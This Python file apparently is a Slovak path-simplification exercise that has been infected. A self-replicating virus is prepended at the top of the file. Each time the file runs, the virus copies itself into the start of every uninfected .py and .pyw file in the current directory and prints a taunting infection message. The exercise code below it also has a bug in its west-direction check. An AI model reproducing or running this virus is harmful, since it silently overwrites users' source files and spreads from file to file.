# VIRUS SAYS HI!

import sys
import glob

virus_code = []

with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

self_replicating_part = False
for line in lines:
    if line == "# VIRUS SAYS HI!":
        self_replicating_part = True
    if not self_replicating_part:
        virus_code.append(line)
    if line == "# VIRUS SAYS BYE!\n":
        break

python_files = glob.glob('*.py') + glob.glob('*.pyw')

for file in python_files:
    with open(file, 'r') as f:
        file_code = f.readlines()

    infected = False

    for line in file_code:
        if line == "# VIRUS SAYS HI!\n":
            infected = True
            break

    if not infected:
        final_code = []
        final_code.extend(virus_code)
        final_code.extend('\n')
        final_code.extend(file_code)
        with open(file, 'w') as f:
            f.writelines(final_code)

def malicious_code():
    print("YOU HAVE BEEN INFECTED HAHAHA !!!")

malicious_code()

# VIRUS SAYS BYE!
cesta = 'SVZSJVZSSSJJVVZ'

upravena_cesta = ''

sever_juh = cesta.count('S') - cesta.count('J')
if sever_juh > 0:
    for i in range(sever_juh):
        upravena_cesta = upravena_cesta + 'S'
if sever_juh < 0:
    for i in range(abs(sever_juh)):
        upravena_cesta = upravena_cesta + 'J'        
        
vychod_zapad = cesta.count('V') - cesta.count('Z')
if vychod_zapad > 0:
    for i in range(vychod_zapad):
        upravena_cesta = upravena_cesta + 'V'
if sever_juh < 0:
    for i in range(abs(vychod_zapad)):
        upravena_cesta = upravena_cesta + 'Z'


print(upravena_cesta)
